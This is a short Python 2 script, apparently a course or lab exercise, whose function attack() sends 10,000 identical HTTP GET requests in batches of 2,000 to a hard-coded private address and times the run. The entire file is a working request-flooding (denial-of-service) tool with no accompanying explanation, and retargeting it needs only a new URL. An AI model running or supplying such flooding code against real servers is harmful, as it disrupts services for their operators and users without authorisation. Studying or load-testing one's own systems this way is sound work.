#!/usr/bin/env python
#-*- coding: utf-8 -*-
import sys
from urlparse import urlparse
import time
import socket as skt



NL = "\r\n"
#Parse the url
def parse_url(url, DEFAULT_PORT=80):#works
    parsed_url = urlparse(url)
    host, path, port = (parsed_url.hostname,
                        parsed_url.path,
                        parsed_url.port)
    if not port:
        port = DEFAULT_PORT
    if parsed_url.scheme=="https":
        print "HTTPS not supported"
        sys.exit()
    return (host, path, port)

def getreq(url):
    host, path, port = parse_url(url)
    P2tag = "u5780417_u5680607"
    return ("GET " + "{p} HTTP/1.1" + NL + "Host: {h}" + NL + "P2Tag: {t}" + NL + NL).format(p=path,h=host,t=P2tag)

def attack(url, numreq, maxCon):
    #Retrieve the http_request from the function that makes it
    http_request = getreq(url)
    #get host and port (Necessary for making the connection)
    host, path, port = parse_url(url)
    #open socket, connect to host and port and then sent the request
    attack_socket = skt.socket(skt.AF_INET, skt.SOCK_STREAM)
    attack_socket.connect((host,port))
    times = numreq/maxCon
    start = time.time()
    numcounter = 0
    for i in range(times):
        start = time.time()
        for j in range(maxCon):
            print "sending how many times", j
            attack_socket.send(http_request)
            numcounter +=1
    end = time.time()
    print end-start

    content_to_load = ""
    head =""
    while '\r\n\r\n' not in head:
        buf = attack_socket.recv(1024)
        head += buf
    return head, numcounter

url = "http://10.27.8.20:8080/"
numreq = 10000
maxCon = 2000
print attack(url,numreq,maxCon)

